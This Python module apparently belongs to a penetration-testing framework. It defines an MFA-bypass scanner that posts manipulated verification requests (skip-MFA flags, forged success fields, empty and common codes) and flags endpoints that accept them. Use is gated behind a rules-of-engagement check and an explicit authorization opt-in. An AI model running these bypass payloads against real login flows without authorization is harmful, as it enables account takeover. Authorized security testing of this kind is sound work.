from __future__ import annotations

from urllib.parse import urlparse

from .config import load_engine
from .contract import Capability, ScanResult
from .roe_guard import ROEGuard, ROEViolation
from . import http as _http


CAPABILITY = Capability(
    name="mfa_bypass",
    description="MFA bypass via response manipulation (authorized contexts only).",
    category="auth",
    cost="medium",
    destructive=False,
    idempotent=False,
    opt_in=True,
    default_on=False,
    destructive_reason=("Touches the live MFA step; may lock the account or "
                        "invalidate the operator's own session."),
)

BYPASS_STRATEGIES = [
    ("mfa_disabled_flag", {"mfa_required": False, "mfaRequired": False,
                            "skip_mfa": True, "skipMfa": True}),
    ("mfa_success_status", {"status": "success", "verified": True,
                             "mfa_verified": True, "mfaVerified": True}),
    ("empty_code", {"code": "", "mfa_code": "", "otp": "", "token": ""}),
    ("success_field_trust", {"success": True, "ok": True,
                             "authenticated": True, "auth": True}),
    ("common_codes", {"code": "000000"}),
    ("common_codes_2", {"code": "123456"}),
    ("admin_code", {"code": "admin"}),
]

SUCCESS_MARKERS = ("token", "session", "authenticated", "welcome",
                    "success", "dashboard", "logged in")
FAILURE_MARKERS = ("invalid", "incorrect", "failed", "unauthorized",
                    "bad code", "wrong", "expired", "try again")


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="POST"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return f"ROE guard unavailable (fail-closed): {e}"
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _post_mfa(mfa_url, body, headers, timeout, verify, roe_guard):
    viol = _roe_block(roe_guard, mfa_url, "POST")
    if viol:
        return {"blocked": True, "error": f"ROE_BLOCK: {viol}"}
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            r = c.post(mfa_url, json=body, headers=headers or {})
        headers_d = {k.lower(): v for k, v in r.headers.items()}
        return {"status": r.status_code, "headers": headers_d,
                "body": (r.text or "")[:2000]}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}"}


def _classify(resp):
    if not resp or resp.get("status") is None:
        return "UNKNOWN", "no response"
    status = resp["status"]
    headers = resp.get("headers") or {}
    body = (resp.get("body") or "").lower()
    loc = (headers.get("location") or "").lower()
    if status in (301, 302, 303, 307, 308):
        if any(m in loc for m in ("/login", "/signin", "/mfa", "/verify")):
            return "PASS", f"rejected (redirect to {loc[:80]})"
        return "VULNERABLE", f"accepted (redirect to {loc[:80]})"
    if status == 200:
        has_cookie = "set-cookie" in headers
        has_success = any(m in body for m in SUCCESS_MARKERS)
        has_fail = any(m in body for m in FAILURE_MARKERS)
        if has_success and not has_fail:
            return "VULNERABLE", "accepted (success body or Set-Cookie)"
        if has_fail:
            return "PASS", "rejected (failure body)"
        if has_cookie:
            return "VULNERABLE", "accepted (Set-Cookie)"
        return "UNKNOWN", "200 without clear marker"
    if status in (401, 403, 429):
        return "PASS", f"rejected (HTTP {status})"
    return "UNKNOWN", f"HTTP {status}"


def scan(mfa_url, base_body=None, headers=None, roe_guard=None,
         timeout=10, authorized=False):
    if not authorized:
        return ScanResult(
            capability="mfa_bypass", target=mfa_url,
            verdict="UNKNOWN",
            reason="MFA bypass requires authorized=True (opt-in destructive)",
        )
    verify = _verify_tls()
    if not base_body or not isinstance(base_body, dict):
        base_body = {"code": "123456"}
    results = {}
    for name, override in BYPASS_STRATEGIES:
        body = dict(base_body)
        body.update(override)
        resp = _post_mfa(mfa_url, body, headers, timeout, verify, roe_guard)
        if resp.get("blocked"):
            return ScanResult(
                capability="mfa_bypass", target=mfa_url,
                verdict="UNKNOWN", reason=resp["error"],
            )
        verdict, reason = _classify(resp)
        results[name] = {"verdict": verdict, "reason": reason,
                         "status": resp.get("status")}
        if verdict == "VULNERABLE":
            return ScanResult(
                capability="mfa_bypass", target=mfa_url,
                verdict="VULNERABLE", severity="critical",
                reason=f"MFA bypassed via {name}: {reason}",
                evidence={"strategy": name, "results": results,
                          "success_body": (resp.get("body") or "")[:300]},
            )
    rank = {"VULNERABLE": 3, "SUSPICIOUS": 2, "PASS": 1, "UNKNOWN": 0}
    overall = "PASS"
    for r in results.values():
        if rank.get(r.get("verdict"), 0) > rank.get(overall, 0):
            overall = r.get("verdict")
    return ScanResult(
        capability="mfa_bypass", target=mfa_url,
        verdict=overall,
        severity="low" if overall == "PASS" else "medium",
        reason=f"{len(results)} bypass strategies tested, no bypass",
        evidence={"results": results},
    )
